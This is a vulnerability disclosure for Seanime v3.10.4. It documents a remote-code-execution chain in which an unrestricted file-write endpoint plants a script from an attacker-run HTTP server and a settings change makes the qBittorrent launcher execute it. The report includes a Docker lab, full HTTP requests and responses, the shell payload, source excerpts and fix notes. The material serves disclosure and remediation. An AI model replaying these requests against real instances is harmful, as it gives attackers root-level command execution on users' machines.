### Vulnerability details

**Official website / Product:** https://seanime.app / https://github.com/5rahim/seanime

**Repository:** 5rahim/seanime (stars at selection: 4294)

**Vulnerability type:** RCE / getshell (unrestricted absolute-path file write + custom qBittorrent path execution)

**Vulnerability versions:** v3.10.4 (latest tag / commit `4bdff7b27b6c043dc87c0ccad3ead54596133a05`); `HandleDownloadTorrentFile` and qBittorrent `Start()` sinks still present

**Vulnerability URL / Parameter:**
- `POST /api/v1/download-torrent-file` — JSON: `destination` (any absolute path), `download_urls`, `clientId` (`CODE:id:code` after WebSocket challenge)
- `PATCH /api/v1/settings/path` — `torrent.default` / `torrent.qbittorrentPath`
- `GET /api/v1/torrent-client/list` — triggers `CheckStart`→`Start()`

**Complex:** yes

### Verification procedure

1. Build and start the lab from the official release binary (original `labs/seanime-r9a1` and image `seanime-r9a1:3.10.4` were removed after verify). Write the `Dockerfile` and `docker-compose.yml` below in any directory, then `docker compose up -d --build`. Host port **18901→43211**; command `-datadir /data -port 43211 -host 0.0.0.0 -disable-password` (passwordless; no login secret). Binary: `https://github.com/5rahim/seanime/releases/download/v3.10.4/seanime-3.10.4_Linux_x86_64.tar.gz` (sha256 `750a41721b2d054f9cf46a70eeb738cb2e1834b124b1586ed27098612ffd4f50`).

```dockerfile
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y --no-install-recommends ca-certificates curl \
    && rm -rf /var/lib/apt/lists/* \
    && curl -fsSL -o /tmp/seanime.tar.gz \
         https://github.com/5rahim/seanime/releases/download/v3.10.4/seanime-3.10.4_Linux_x86_64.tar.gz \
    && tar -xzf /tmp/seanime.tar.gz -C /usr/local/bin \
    && rm /tmp/seanime.tar.gz \
    && chmod +x /usr/local/bin/seanime
WORKDIR /data
EXPOSE 43211
ENTRYPOINT ["seanime"]
```

```yaml
services:
  seanime:
    build: .
    image: seanime-r9a1:3.10.4
    container_name: seanime-r9a1
    volumes:
      - ./data:/data
    ports:
      - "18901:43211"
    environment:
      HTTP_PROXY: ""
      HTTPS_PROXY: ""
      http_proxy: ""
      https_proxy: ""
      ALL_PROXY: ""
      all_proxy: ""
      NO_PROXY: "*"
      no_proxy: "*"
    command: ["-datadir", "/data", "-port", "43211", "-host", "0.0.0.0", "-disable-password"]
```

2. Pre-create an executable placeholder in the data volume (`os.Create` overwrite keeps the prior mode, so +x must already exist):
   `docker exec seanime-r9a1 sh -c 'echo placeholder > /data/evil-src && chmod +x /data/evil-src'`
3. Serve attacker HTTP reachable from the container (lab used `172.23.0.1:18991`) with `Content-Disposition: attachment; filename="evil-src"` and body:
   ```sh
   #!/bin/sh
   echo "RCE_OK $(id)" > /data/RCE_PROOF2.txt
   ```
4. Fix a `Seanime-Client-Id` (same value in Cookie and `X-Seanime-Client-Id`) and connect `ws://127.0.0.1:18901/events` (no token when password unset).
5. `POST /api/v1/download-torrent-file` with a non-`CODE:` `clientId` to receive WS event `download-torrent-file-permission-check` (`challengeId:code`). Replay with `clientId=CODE:{id}:{code}`, `destination=/data`, and `download_urls` pointing at the attacker HTTP server.
6. `PATCH /api/v1/settings/path` to set `torrent.default=qbittorrent`, then PATCH `torrent.qbittorrentPath=/data/evil-src` (Trusted Origin required when passwordless, e.g. `Origin: http://127.0.0.1:18901`).
7. `GET /api/v1/torrent-client/list` — on list failure the handler calls `TorrentClientRepository.Start()`→qBittorrent `CheckStart`→`Start()`, executing the written script.
8. Observe `/data/RCE_PROOF2.txt` inside the container containing `uid=0(root)`. Observed result:
   ```
   -rwxr-xr-x 1 root root 59 Nov  1 12:47 /data/evil-src
   ---
   RCE_OK uid=0(root) gid=0(root) groups=0(root)
   ```

### Complete vulnerability PoC

**0) Attacker HTTP source (example on 18991)**

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="evil-src"
Content-Length: 59
Connection: close

#!/bin/sh
echo "RCE_OK $(id)" > /data/RCE_PROOF2.txt
```

**1) Challenge probe (non-CODE clientId; HTTP returns `{"data":false}`; code arrives on WS)**

```http
POST /api/v1/download-torrent-file HTTP/1.1
Host: 127.0.0.1:18901
Content-Type: application/json
Origin: http://127.0.0.1:18901
Cookie: Seanime-Client-Id=630b6858-d818-4584-a165-7c7f78fb59d8
X-Seanime-Client-Id: 630b6858-d818-4584-a165-7c7f78fb59d8
Connection: close
Accept: */*
User-Agent: seanime-r9a1-poc/1.0
Content-Length: 97

{"download_urls":["http://172.23.0.1:18991/"],"destination":"/data","media":null,"clientId":"probe"}
```

WebSocket `/events` receives: `download-torrent-file-permission-check` → `psjx2vv2i6on0hi3:XOGhWHuSw9XhPUsVhnjJKg3Wv2CjAssq` (example; random each run).

**2) Arbitrary absolute-path write (Docker-verified)**

```http
POST /api/v1/download-torrent-file HTTP/1.1
Host: 127.0.0.1:18901
Content-Type: application/json
Origin: http://127.0.0.1:18901
Cookie: Seanime-Client-Id=630b6858-d818-4584-a165-7c7f78fb59d8
X-Seanime-Client-Id: 630b6858-d818-4584-a165-7c7f78fb59d8
Content-Length: 149
Connection: close
Accept: */*
User-Agent: seanime-r9a1-poc/1.0

{"download_urls":["http://172.23.0.1:18991/"],"destination":"/data","media":null,"clientId":"CODE:psjx2vv2i6on0hi3:XOGhWHuSw9XhPUsVhnjJKg3Wv2CjAssq"}
```

```http
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: http://127.0.0.1:18901
Access-Control-Expose-Headers: X-Seanime-Client-Id,X-Seanime-Client-Id-Proof
Content-Type: application/json
Vary: Origin
X-Seanime-Client-Id: 630b6858-d818-4584-a165-7c7f78fb59d8
X-Seanime-Client-Id-Proof: eyJlbmRwb2ludCI6ImNsaWVudC1pZDo2MzBiNjg1OC1kODE4LTQ1ODQtYTE2NS03YzdmNzhmYjU5ZDgiLCJpYXQiOjE3OTM1MzcxNTQsImV4cCI6MTc5MzYyMzU1NH0.nIoACvIgpROu40SCjgROOpKliSSfsoJOKp8pnB7L_IU
Date: Sun, 01 Nov 2026 12:45:54 GMT
Content-Length: 14
Connection: close

{"data":true}
```

**3) Set default torrent client to qbittorrent**

```http
PATCH /api/v1/settings/path HTTP/1.1
Host: 127.0.0.1:18901
Cookie: Seanime-Client-Id=2c66f338-f936-40e3-a3cd-7a6547e28f93
X-Seanime-Client-Id: 2c66f338-f936-40e3-a3cd-7a6547e28f93
Connection: close
User-Agent: seanime-r9a1-poc/1.0
Accept: */*
Origin: http://127.0.0.1:18901
Content-Type: application/json
Content-Length: 48

{"path":"torrent.default","value":"qbittorrent"}
```

**4) Point qbittorrentPath at the written evil-src (Docker-verified)**

```http
PATCH /api/v1/settings/path HTTP/1.1
Host: 127.0.0.1:18901
Cookie: Seanime-Client-Id=2c66f338-f936-40e3-a3cd-7a6547e28f93
X-Seanime-Client-Id: 2c66f338-f936-40e3-a3cd-7a6547e28f93
Connection: close
User-Agent: seanime-r9a1-poc/1.0
Accept: */*
Origin: http://127.0.0.1:18901
Content-Type: application/json
Content-Length: 59

{"path":"torrent.qbittorrentPath","value":"/data/evil-src"}
```

```http
HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: http://127.0.0.1:18901
Access-Control-Expose-Headers: X-Seanime-Client-Id,X-Seanime-Client-Id-Proof
Content-Type: application/json
Vary: Origin
X-Seanime-Client-Id: 2c66f338-f936-40e3-a3cd-7a6547e28f93
X-Seanime-Client-Id-Proof: eyJlbmRwb2ludCI6ImNsaWVudC1pZDoyYzY2ZjMzOC1mOTM2LTQwZTMtYTNjZC03YTY1NDdlMjhmOTMiLCJpYXQiOjE3OTM1MzcyMzIsImV4cCI6MTc5MzYyMzYzMn0.emg4vA39l84-w-BLAiFlcgpJpgQd8Vk6g95q7n4DEqA
Date: Sun, 01 Nov 2026 12:47:12 GMT
Connection: close
Transfer-Encoding: chunked

{"data":{"os":"linux","clientDevice":"desktop","clientPlatform":"-","clientUserAgent":"seanime-r9a1-poc/1.0","dataDir":"/data","user":{"viewer":{"name":"User"},"token":"SIMULATED","isSimulated":true},"settings":null,"version":"3.10.4","versionName":"Saisei","themeSettings":{"id":0,"createdAt":"0001-01-01T00:00:00Z","updatedAt":"0001-01-01T00:00:00Z","enableColorSettings":false,"backgroundColor":"","accentColor":"","sidebarBackgroundColor":"","animeEntryScreenLayout":"","expandSidebarOnHover":false,"hideTopNavbar":false,"enableMediaCardBlurredBackground":false,"libraryScreenCustomBackgroundImage":"","libraryScreenCustomBackgroundOpacity":0,"smallerEpisodeCarouselSize":false,"libraryScreenBannerType":"","libraryScreenCustomBannerImage":"","libraryScreenCustomBannerPosition":"","libraryScreenCustomBannerOpacity":0,"disableLibraryScreenGenreSelector":false,"libraryScreenCustomBackgroundBlur":"","enableMediaPageBlurredBackground":false,"disableSidebarTransparency":false,"useLegacyEpisodeCard":false,"disableCarouselAutoScroll":false,"mediaPageBannerType":"","mediaPageBannerSize":"","mediaPageBannerInfoBoxSize":"","showEpisodeCardAnimeInfo":false,"continueWatchingDefaultSorting":"","animeLibraryCollectionDefaultSorting":"","mangaLibraryCollectionDefaultSorting":"","showAnimeUnwatchedCount":false,"showMangaUnreadCount":false,"hideEpisodeCardDescription":false,"hideDownloadedEpisodeCardFilename":false,"customCSS":"","mobileCustomCSS":"","unpinnedMenuItems":null,"homeItems":null,"enableBlurringEffects":false,"hideAnimeSpoilers":false,"hideAnimeSpoilerThumbnails":false,"hideAnimeSpoilerTitles":false,"hideAnimeSpoilerDescriptions":false,"hideAnimeSpoilerSkipNextEpisode":false},"isOffline":false,"mediastreamSettings":{"id":1,"createdAt":"2026-11-01T12:36:29.923447914Z","updatedAt":"2026-11-01T12:36:29.923447914Z","transcodeEnabled":false,"transcodeHwAccel":"cpu","transcodeThreads":0,"transcodePreset":"fast","disableAutoSwitchToDirectPlay":false,"directPlayOnly":false,"preTranscodeEnabled":false,"preTranscodeLibraryDir":"","ffmpegPath":"ffmpeg","ffprobePath":"ffprobe","transcodeHwAccelCustomSettings":""},"torrentstreamSettings":{"id":1,"createdAt":"2026-11-01T12:36:29.926090404Z","updatedAt":"2026-11-01T12:36:29.926090404Z","enabled":false,"autoSelect":true,"preferredResolution":"","disableIPV6":false,"downloadDir":"","addToLibrary":false,"torrentClientHost":"","torrentClientPort":43213,"streamingServerHost":"0.0.0.0","streamingServerPort":43214,"includeInLibrary":false,"streamUrlAddress":"","slowSeeding":false,"preloadNextStream":false,"disableAcceleratedStartup":false},"debridSettings":{"id":1,"createdAt":"2026-11-01T12:36:29.930745299Z","updatedAt":"2026-11-01T12:36:29.930745299Z","enabled":false,"provider":"","apiKey":"","includeDebridStreamInLibrary":false,"streamAutoSelect":false,"streamPreferredResolution":""},"anilistClientId":"","updating":false,"isDesktopSidecar":false,"featureFlags":{"builtinTorrentClient":false,"dummyDebrid":false},"disabledFeatures":null,"serverReady":true,"serverHasPassword":false,"showChangelogTour":""}}
```

**5) Trigger Start() (Docker-verified)**

```http
GET /api/v1/torrent-client/list HTTP/1.1
Host: 127.0.0.1:18901
Cookie: Seanime-Client-Id=2c66f338-f936-40e3-a3cd-7a6547e28f93
X-Seanime-Client-Id: 2c66f338-f936-40e3-a3cd-7a6547e28f93
Connection: close
User-Agent: seanime-r9a1-poc/1.0
Accept: */*
```

```http
HTTP/1.1 500 Internal Server Error
Content-Type: application/json
Vary: Origin
X-Seanime-Client-Id: 2c66f338-f936-40e3-a3cd-7a6547e28f93
X-Seanime-Client-Id-Proof: eyJlbmRwb2ludCI6ImNsaWVudC1pZDoyYzY2ZjMzOC1mOTM2LTQwZTMtYTNjZC03YTY1NDdlMjhmOTMiLCJpYXQiOjE3OTM1MzcyMzMsImV4cCI6MTc5MzYyMzYzM30.lk58FDmcu2bbKwHZNNAtdOyGtwwy31hC3Ry3KWwfk-c
Date: Sun, 01 Nov 2026 12:47:44 GMT
Content-Length: 65
Connection: close

{"error":"could not start torrent client, verify your settings"}
```

(HTTP 500 is expected: the fake client never answers the qBittorrent API probe; `cmd.Start()` still runs the malicious script before that failure.)

Verification result notes:

- Write response is `HTTP/1.1 200` with `{"data":true}`; payload lands at `/data/evil-src` (overwriting a pre-existing +x file keeps the executable bit; observed mode `-rwxr-xr-x`, size 59).
- Subsequent `GET /api/v1/torrent-client/list` calls `cmd.Start()` on that path before the qBittorrent HTTP API probe fails; observed in-container:
  ```
  -rwxr-xr-x 1 root root 59 Nov  1 12:47 /data/evil-src
  ---
  RCE_OK uid=0(root) gid=0(root) groups=0(root)
  ```
- `guardStrictLocalOnlyAction` / `guardStrictFilesystemPath` only constrain paths when `securemode=strict`. The WS challenge is readable by any `/events` subscriber for the same client id and does not stop a LAN/API attacker.
- Lab: image `seanime-r9a1:3.10.4`, port `18901`, `-disable-password`; Dockerfile / compose are in the verification procedure above.

### Vulnerability analysis

`HandleDownloadTorrentFile` requires an absolute `destination`, but outside strict mode `guardStrictLocalOnlyAction` / `guardStrictFilesystemPath` are no-ops, so the caller may choose any directory. `downloadTorrentFile` joins that destination with a cleaned `Content-Disposition` basename, then `os.Create` + `io.Copy` writes attacker-controlled bytes. The “permission check” only echoes `challengeId:code` to the same WebSocket `clientId`; on passwordless servers the attacker opens `/events` themselves, so the check is not a remote-attacker boundary.

After the write, `PATCH /api/v1/settings/path` sets `torrent.default=qbittorrent` and `torrent.qbittorrentPath` to the planted file (Trusted Origin when passwordless; any authenticated client once a server password is set). `GET /api/v1/torrent-client/list` on list failure calls `TorrentClientRepository.Start()`→qBittorrent `CheckStart`→`Start()`: `util.NewCmd(exe).Start()` executes the custom path — getshell as the Seanime process user (root in this Docker lab).

Trigger / sink source (full path and line numbers, v3.10.4):

```go
# File: internal/handlers/download.go
# Lines: 43-145 (HandleDownloadTorrentFile), 147-189 (downloadTorrentFile)
func (h *Handler) HandleDownloadTorrentFile(c echo.Context) error {
        // ...
        if err := h.guardStrictLocalOnlyAction(c); err != nil { // no-op unless strict
                return err
        }
        if !filepath.IsAbs(b.Destination) {
                return h.RespondWithError(c, errors.New("destination path must be absolute"))
        }
        if err := h.guardStrictFilesystemPath(c, b.Destination); err != nil { // no-op unless strict
                return err
        }
        if !strings.HasPrefix(b.ClientId, "CODE:") {
                // WS: download-torrent-file-permission-check → challengeID:randomCode
                h.App.WSEventManager.SendEventTo(contextClientId, "download-torrent-file-permission-check", challengeID+":"+randomCode)
                return h.RespondWithData(c, false)
        }
        // validate CODE:challengeId:code against in-memory map for same clientId ...
        for _, url := range b.DownloadUrls {
                err := downloadTorrentFile(url, b.Destination)
                // ...
        }
        return h.RespondWithData(c, true)
}

func downloadTorrentFile(url string, dest string) (err error) {
        resp, err := http.Get(url)
        // ...
        fileName := getTorrentFileName(resp, url) // Content-Disposition filename
        filePath := filepath.Join(dest, fileName)
        _ = os.MkdirAll(dest, 0755)
        out, err := os.Create(filePath) // arbitrary write under destination
        _, err = io.Copy(out, resp.Body)
        return nil
}
```

```go
# File: internal/handlers/torrent_client.go
# Lines: 29-57 (Start after list failure)
func (h *Handler) HandleGetActiveTorrentList(c echo.Context) error {
        res, err := h.App.TorrentClientRepository.GetActiveTorrents(...)
        if err != nil {
                // ...
                ok := h.App.TorrentClientRepository.Start() // → qbittorrent.CheckStart
                if !ok {
                        return h.RespondWithError(c, errors.New("could not start torrent client, verify your settings"))
                }
                // ...
        }
        return h.RespondWithData(c, res)
}
```

```go
# File: internal/torrent_clients/qbittorrent/start.go
# Lines: 19-58
func (c *Client) getExecutablePath() string {
        if len(c.Path) > 0 {
                return c.Path // attacker-controlled qbittorrentPath
        }
        // OS defaults ...
}

func (c *Client) Start() error {
        if c.Path == "" {
                return nil
        }
        // ...
        exe := c.getExecutablePath()
        cmd := util.NewCmd(exe)
        err := cmd.Start() // RCE
        // ...
}
```

### Fix notes

1. Constrain `destination` to explicit allowlisted roots even when not in strict mode.
2. Elevate download authorization to privileged-local (or a confirmation that a pure API/WS attacker cannot self-complete).
3. Do not auto-`Start()` custom external client binaries from routine list/status probes; require an explicit privileged action.
4. Be careful with overwrite semantics that preserve prior executable bits on replaced files.
